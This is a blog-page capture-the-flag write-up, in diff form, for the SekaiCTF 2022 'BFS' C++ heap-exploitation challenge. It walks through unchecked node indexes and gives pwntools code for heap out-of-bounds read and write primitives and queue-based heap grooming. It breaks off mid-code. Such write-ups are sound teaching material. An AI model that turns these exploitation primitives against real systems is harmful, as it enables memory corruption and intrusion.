@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <link rel="stylesheet" href="/assets/css/normalize.css">
+  <link rel="stylesheet" href="/assets/css/ockham.css">
+  <script async src="/assets/js/ockham.js"></script>
+  <script async src="https://use.fontawesome.com/releases/v5.15.4/js/all.js"></script>
+
+  
+
+</head>
+
+
+  <body>
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>This is where I'll post writeups and such</p>
+  </div>
+
+  
+  <nav class="sidebar-nav">
+    <ul class="sidebar-nav-list">
+    
+      <li">
+        <a href="/" class="sidebar-nav-item ">
+          Feed
+        </a>
+      </li>
+    
+      <li">
+        <a href="/about/" class="sidebar-nav-item ">
+          About
+        </a>
+      </li>
+    
+    </ul>
+  </nav>
+  
+
+  
+  <div class="sidebar-item">
+    
+      <a class="social-icon" href="https://github.com/Day91" target="_blank">
+        <i class="fab fa-github" title="GitHub"></i>
+      </a>
+    
+      <a class="social-icon" href="https://app.hackthebox.com/users/185587" target="_blank">
+        <i class="fas fa-cube" title="Hack The Box"></i>
+      </a>
+    
+  </div>
+  
+
+  <div class="sidebar-item">
+    <small>
+      Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> & <a href="https://github.com/zivong/ockham" target="_blank">Ockham</a>
+    </small>
+  </div>
+</div>
+
+
+    <div class="wrap">
+      <div class="container">
+
+        <header class="masthead">
+          <div class="masthead-title">
+            <a href="/" title="Home">Day91's Blog</a>
+            <small>It's daytime somewhere :)</small>
+          </div>
+        </header>
+
+        <main>
+          <article class="post">
+  <h1 class="post-title">SekaiCTF 2022: BFS</h1>
+  <div class="post-meta">
+    <time datetime="2022-10-07T00:00:00+01:00" itemprop="datePublished">
+      07 Oct 2022
+    </time></div>
+
+  <p>This was a pretty interesting c++ binary exploitation challenge I solved(first blood, always be flexing 😛)</p>
+
+<p>It consisted of a no pie and partial relro heap exploitation of a vulnerable C++ implementation of breadth first search unweighted shortest-path finding.</p>
+
+<!--end_excerpt-->
+<p>I didn’t really start the challenge until night time on saturday when I noticed the source was released after giving up on Mind Calculator, lol</p>
+
+<p>Let’s get into solving the challenge!</p>
+<h2 id="introduction">Introduction</h2>
+<p>I’m going to explain a couple ADT’s used in this program just to make it easier to understand. Note that this writeup assumes some basic knowledge of glibc heap exploitation, and some basic binary exploitation stuff.</p>
+
+<h3 id="graphs">Graphs</h3>
+
+<p>To those unfamiliar, a graph is an Abstract Data Type represented by many nodes or “vertices” which are connected with edges. A graph can be used to represent many things, commonly maps or areas. Graphs are often represented as an adjacency matrix, where each row would represent the relationships for a given node, and each value in that row gives information on if there is a connection between the two nodes. For example <code class="language-plaintext highlighter-rouge">matrix[0][1]</code> would tell you if there’s a connection between node 0 and node 1.</p>
+
+<p>In this ase the adjacency matrix was implemented as a 1d array where <code class="language-plaintext highlighter-rouge">matrix[a][b] = adj_matrix[a * 256 + b]</code></p>
+
+<p>Graphs can be traversed to find paths between two nodes by two main algorithms - depth-first search and breadth-first search. The former is not important for this challenge.</p>
+
+<p>Breadth-first search essentially works by starting at a node, and then looking first at all the connections to that node. Then, for each of those nodes, look at their connections, ignoring previously visited nodes. It basically goes layer by layer, thus going for <strong>breadth</strong> first. Since BFS(breadth-first-search) goes layer by layer, the first path it finds will always be the shortest in an unweighted graph. Depth-first search works differently, essentially going as far as it can in one direction until it needs to backtrack. (It goes for <strong>depth</strong> first!)</p>
+
+<p>The details of the algorithm are not that important for understanding the challenge solution but it is helpful.</p>
+
+<h3 id="queues">Queues</h3>
+<p>A queue is pretty intuitive, usually a FIFO data structure - data is pushed onto the queue, and popped off of it. The value popped off is the first value to have been pushed onto it, and so forth. Queues can be implemented statically(with a fixed size array) or dynamically(allocating as required). Dynamically it is often done with a linked list but not always, as we will see later!</p>
+
+<p>There are <strong>double-ended queues</strong> or <strong>dequeues</strong> which are essentially the same but let you push and pop from both ends of the queue.</p>
+
+<p>Queues can also be <strong>linear</strong> or <strong>circular</strong>- a linear queue works by keeping a front and a back pointer and pushing values onto the back and popping them off the front. As values are pushed and popped(or enqueued and dequeued) off the queue, however, it simply “shifts” - it doesn’t reuse space which has since become useless. A dynamic linear implementation may use a linked list, in which case space is not wasted, but otherwise it may keep allocating new space as it shifts, which does waste space(but is very helpful for us!)</p>
+
+<p>A <strong>circular</strong> queue wraps around itself and uses memory space from the front that is now unused, however at the cost of having to maintain more information.</p>
+
+<h2 id="source-code-analysis">Source Code Analysis</h2>
+<p>The program sets a maximum number of nodes(256) and represents the graph via an adjacency matrix implemented as a single 1-dimensional array as 256*256 in size, taking a static approach. It uses <code class="language-plaintext highlighter-rouge">vis</code> and <code class="language-plaintext highlighter-rouge">parent</code> arrays to keep track of visited nodes and parent nodes respectively(with <code class="language-plaintext highlighter-rouge">parent[node_idx] giving the "parent" of that node in the path</code>.</p>
+
+<p>All these arrays are allocated on the heap via the <code class="language-plaintext highlighter-rouge">new</code> keyword in c++, which will be important later.</p>
+
+<p>The BFS algorithm is as follows,</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">bfs</span><span class="p">(</span><span class="n">uint</span> <span class="n">from</span><span class="p">,</span> <span class="n">uint</span> <span class="n">dest</span><span class="p">,</span> <span class="n">uint</span> <span class="n">n</span><span class="p">)</span>  <span class="p">{</span>
+    <span class="n">uint</span> <span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">parent</span><span class="p">[</span><span class="n">from</span><span class="p">]</span> <span class="o">=</span> <span class="n">from</span><span class="p">;</span>
+    <span class="n">q</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">from</span><span class="p">);</span>
+    <span class="n">vis</span><span class="p">[</span><span class="n">from</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">q</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span>   <span class="p">{</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="n">front</span><span class="p">();</span>
+        <span class="n">q</span><span class="p">.</span><span class="n">pop</span><span class="p">();</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">adj_matrix</span><span class="p">[</span><span class="n">tmp</span><span class="o">*</span><span class="n">MAX_NUMBER_OF_NODES</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">vis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">vis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="n">parent</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+                <span class="n">q</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">dest</span><span class="p">)</span>
+                    <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In simpler terms,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set the start node's parent to itself, denoting it is the start.
+Push it into the queue.
+While the queue is not empty,
+	Pop a node index off the queue, set it to tmp
+	For all nodes, if node is connected to tmp and has not been visited,
+		Set the node's visited status to true
+		Set the node's parent to tmp
+		Push the node onto the queue
+		If the node is our destination, return
+</code></pre></div></div>
+<p>I didn’t discover this until later, but there is an inherent issue with this code - if the function does not naturally terminate from the while loop ending(i.e the queue is empty and all values have been popped off and traversed) and instead terminates within the for loop, the queue will not be cleared. This doesn’t directly introduce any serious memory corruption vulnerabilities, but it is something that will be useful during the exploitation process.</p>
+
+<p>Now to understand how the main program operates.</p>
+
+<p>The challenge description already gives a pretty sound description of the input format</p>
+<blockquote>
+  <p>Each test contains multiple test cases. The first line contains a single integer  T  - the number of test cases. Description of the test cases follows.</p>
+</blockquote>
+
+<blockquote>
+  <p>The first line of the input contains two unsigned integers  N  and  K  - the number of nodes and edges respectedly.</p>
+</blockquote>
+
+<blockquote>
+  <p>Each of the next  K  lines contains two unsigned integers  V  and  U  - the description of an edge.</p>
+</blockquote>
+
+<blockquote>
+  <p>The last line contains two unsigned integers  P  and  Q  - the to and from nodes.</p>
+</blockquote>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">init</span><span class="p">();</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">choice</span><span class="p">;</span>
+    <span class="n">uint</span> <span class="n">q</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span><span class="n">k</span><span class="p">;</span>
+    <span class="n">uint</span> <span class="n">from</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">crawl</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">q</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">uint</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">l</span> <span class="o">&lt;</span> <span class="n">q</span><span class="p">;</span> <span class="n">l</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="n">k</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="n">MAX_NUMBER_OF_NODES</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+            <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+                <span class="n">adj_matrix</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">MAX_NUMBER_OF_NODES</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+            <span class="n">vis</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">k</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">from</span> <span class="o">&gt;&gt;</span> <span class="n">dest</span><span class="p">;</span>
+            <span class="n">adj_matrix</span><span class="p">[</span><span class="n">from</span><span class="o">*</span><span class="n">MAX_NUMBER_OF_NODES</span> <span class="o">+</span> <span class="n">dest</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+            <span class="n">adj_matrix</span><span class="p">[</span><span class="n">dest</span><span class="o">*</span><span class="n">MAX_NUMBER_OF_NODES</span> <span class="o">+</span> <span class="n">from</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">from</span> <span class="o">&gt;&gt;</span> <span class="n">dest</span><span class="p">;</span>
+        <span class="n">bfs</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+        <span class="n">crawl</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Testcase #"</span> <span class="o">&lt;&lt;</span> <span class="n">l</span> <span class="o">&lt;&lt;</span> <span class="s">": "</span><span class="p">;</span>
+        <span class="k">while</span><span class="p">(</span><span class="n">parent</span><span class="p">[</span><span class="n">crawl</span><span class="p">]</span> <span class="o">!=</span> <span class="n">crawl</span><span class="p">)</span>   <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">crawl</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span><span class="p">;</span>
+            <span class="n">crawl</span> <span class="o">=</span> <span class="n">parent</span><span class="p">[</span><span class="n">crawl</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">crawl</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The program doesn’t take all of the test cases at once but instead forms an interactive prompt, which is again going to be useful for exploitation.</p>
+
+<p>It clears as much of the vis array and adjacency matrix as matters for the given amount of nodes, and then adds all the edges to the adjacency matrix pretty intuitively, going both ways.</p>
+
+<p>Most notably, <strong>there are no bounds checks at all</strong>. Whilst it makes sure that you don’t set a number of nodes higher than the maximum before clearing the relevant indexes of the vis and adjacency matrix arrays, individual node indexes are not checked when</p>
+<ul>
+  <li>Adding edges in the adjacency matrix</li>
+  <li>Running the BFS algorithm</li>
+  <li>Crawling to find the path via the parents array</li>
+</ul>
+
+<p>The first and third of these vulnerabilities will be what we use the most. Having found all of these, it’s time to get exploiting.</p>
+
+<h2 id="gaining-primitives">Gaining Primitives</h2>
+<p>The top three primitives I used for my exploit were</p>
+<ul>
+  <li>Heap OOB write whilst knowing the original data</li>
+  <li>Heap OOB read</li>
+  <li>Heap allocation, freeing, and population of fixed sizes</li>
+</ul>
+
+<p>I used the provided Dockerfile to debug locally. For transforming normal dockers into a debug environment, I usually add a</p>
+<div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">ENV</span><span class="s"> DEBIAN_FRONTEND noninteractive</span>
+<span class="k">RUN </span>apt <span class="nb">install</span> <span class="nt">-y</span> gdb python3 curl python3-pip wget git ltrace
+</code></pre></div></div>
+<p>And run the docker whilst forwarding the port to my host.
+I usually drop into a shell with <code class="language-plaintext highlighter-rouge">docker exec -u 0 /bin/bash</code> and then install pwndbg in /opt using</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git  clone https://github.com/pwndbg/pwndbg
+<span class="nb">cd </span>pwndbg
+./setup.sh
+</code></pre></div></div>
+
+<p>That sets up a pretty nice debug environment, for which after connecting to the program on the host you can run <code class="language-plaintext highlighter-rouge">gdb -p $(pidof bfs)</code> in the docker.</p>
+
+<p>I built a simple skeleton to communicate with the program by sending test cases, and ability to receive the path information.</p>
+
+<p>I also copied the libc file out of the docker with <code class="language-plaintext highlighter-rouge">docker cp</code>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bfs"</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">FULLREMOTE</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challs.ctf.sekai.team"</span><span class="p">,</span> <span class="mi">4004</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">process</span><span class="p">()</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span> <span class="k">else</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5000"</span><span class="p">)</span> <span class="c1"># Should be enough test cases!
+</span><span class="k">def</span> <span class="nf">sendtestcase</span><span class="p">(</span><span class="n">numnodes</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">edges</span><span class="o">=</span><span class="p">[]):</span>
+    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">edges</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
+        <span class="n">edges</span> <span class="o">=</span> <span class="p">[</span><span class="n">edges</span><span class="p">]</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">numnodes</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">edges</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">edge</span> <span class="ow">in</span> <span class="n">edges</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">edge</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">edge</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">to</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">recvdata</span><span class="p">(</span><span class="n">interactive</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">interactive</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+        <span class="n">quit</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="heap-oob-write-whilst-knowing-the-original-data">Heap OOB write whilst knowing the original data</h3>
+<p>One interesting thing is that when adding edges to the adjacency matrix it uses the <code class="language-plaintext highlighter-rouge">++</code> syntax as opposed to setting it to 1 directly. This means that when we use the OOB vulnerability, we can begin to edit the data as it will simply increment as opposed to setting to 1, giving a powerful primitive. With the ability to put arbitrary node indexes, we can make sure that <code class="language-plaintext highlighter-rouge">from * MAX_NUMBER_OF_NODES + dest</code> equals an index to the arbitrary byte that we want. <strong>Note that all of the arrays we have been talking about are of type uint8_t</strong></p>
+
+<p>As numbers will overflow, so 0xff + 1 will wrap around to 0, this creates a full OOB write primitive - <strong>as long as we know the original value</strong>. Without that, we can only blindly add. This means leaking will be important in the exploit later. However, we can now build the OOB write primitive. My primitive function, given parameters, constructs the series of edges required to do the editing that was needed.</p>
+
+<p><strong>NOTE: I did attempt to go backwards with this, but it appears it is impossible, as from and dest are type uint and so will not be sign extended for additions. This means that, for example, <code class="language-plaintext highlighter-rouge">1 + 0xffffffff</code> which would give 0 when dealing with sign extended integers, gives <code class="language-plaintext highlighter-rouge">0x100000000</code> instead - the carry bit won’t be ignored, so overflowing the address to go backwards is not possible.</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">edit_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">turninto</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">turninto</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
+        <span class="n">turninto</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">turninto</span><span class="p">)</span>
+    <span class="c1"># Build edges that do arbitrary write at a given offset.
+</span>    <span class="c1"># Requires knowledge of what the original data was.
+</span>
+    <span class="c1"># NOTE: There will be side effects becausee edges go both ways. I wonder if this matters.
+</span>    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">turninto</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">turninto</span><span class="p">)</span>
+    <span class="n">edges</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="n">turninto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="n">i</span> 
+        <span class="n">edge</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">divmod</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="mi">256</span><span class="p">))</span> <span class="c1"># 256*from + dest, we dont just use 0 and the offset we want because then 256*dest + from will be invalid
+</span>        <span class="n">edges</span> <span class="o">+=</span> <span class="p">[</span><span class="n">edge</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">diff</span><span class="p">)]</span> <span class="c1"># Add 1 that many times
+</span>    <span class="k">return</span> <span class="n">edges</span>
+</code></pre></div></div>
+
+<h3 id="heap-oob-read">Heap OOB read</h3>
+<p>This is somewhat easier. Consider the following snippet of code:</p>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="n">crawl</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
+		<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Testcase #"</span> <span class="o">&lt;&lt;</span> <span class="n">l</span> <span class="o">&lt;&lt;</span> <span class="s">": "</span><span class="p">;</span>
+        <span class="k">while</span><span class="p">(</span><span class="n">parent</span><span class="p">[</span><span class="n">crawl</span><span class="p">]</span> <span class="o">!=</span> <span class="n">crawl</span><span class="p">)</span>   <span class="p">{</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">crawl</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span><span class="p">;</span>
+            <span class="n">crawl</span> <span class="o">=</span> <span class="n">parent</span><span class="p">[</span><span class="n">crawl</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">crawl</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Should the <code class="language-plaintext highlighter-rouge">bfs</code> function have worked as intended, traversing the parents of each node until you find a node that is marked as the beginning would work for finding the path. What if we send an ending value that could never be found, though?</p>
+
+<p>The bfs function would, necessarily, end up terminating after popping all the values of the queue and having nothing left, exiting the while loop. Afterwards, however, <code class="language-plaintext highlighter-rouge">parent[crawl]</code> is read, thus giving us an OOB read if we use it correctly.</p>
+
+<p>Since this array is of type <code class="language-plaintext highlighter-rouge">uint8_t</code>, it means that the value that will be read will only be a singular byte, and most notably still a valid index in the parent array which it will continue to traverse until it finds an ending. The parent array will likely be set up to not cause an infinite loop in this situation(likely… see our issues later!) so we can build a simple OOB read primitive by setting the destination node to be an arbitrary index and thus being able to leak the byte at that index.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">interactive</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+        <span class="n">sendtestcase</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]])</span>
+        <span class="n">b</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">recvdata</span><span class="p">(</span><span class="n">interactive</span><span class="p">)[</span><span class="mi">1</span><span class="p">]])</span>
+    <span class="k">return</span> <span class="n">b</span>
+</code></pre></div></div>
+
+<h3 id="heap-allocation-primitives-transient">Heap allocation primitives: transient</h3>
+
+<p>This is the hardest bit that made me scratch my head for ages. With just a heap OOB r/w, but with no way to allocate properly, it’s next to useless. I first tried to execute an unlink attack with the buffer chunk allocated to receive our input from stdin, but the chunk was never freed, so that was a bit useless.</p>
+
+<p>I have had very unenjoyable experiences attempting to mess with c++ objects in the past so I didn’t really feel like touching the queue object, but it was the only option really. It turns out, it was a lot more intuitive to understand thanI thought, and was invaluable for the exploit.</p>
+
+<p>I researched the std::queue implementation and found it was wrapped around a std::dequeue, which is obviously not that helpful lol</p>
+
+<p>I then researched the std::dequeue implementation and found <a href="https://stackoverflow.com/questions/6292332/what-really-is-a-deque-in-stl">this stack overflow post</a> which was very helpful. <a href="https://stackoverflow.com/a/6292437">This answer</a> in particular.</p>
+
+<p>The dequeue is, as far as I can understand, a dynamic linear implementation of a queue using a vector of vectors, we can think of it as a linear queue which stores pointers to mini linear queues that have the actual values.</p>
+
+<p>The queue starts with a singular pointer in its vector to a large chunk with space for 512 values. For now, since the queue is linear, it will suffice to cause 256 different values to be pushed onto the queue via the breadth first traversal algorithm(and subsequently popped off), then another 256. This will cause the queue to allocate a new chunk for use as a second vector(<strong>recall that linear queues do not go back and use space even when earlier values have been popped off</strong>), whilst freeing our original chunk since all the values on it have been popped off.</p>
+
+<p>With a little bit of massage from that, it’s pretty easy to get a free chunk to appear <em>after</em> the <code class="language-plaintext highlighter-rouge">adj_matrix</code> and <code class="language-plaintext highlighter-rouge">parents</code> array despite the queue being allocated <em>beforehand</em>, which we can then mess with.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># HEAP ALLOCATION PRIMITIVE: QUEUE MANIPULATIOn
+# When it finds a node, it leaves the queue full, letting us arbitrarily inflate and deflate at will(with clever calculations of course)#
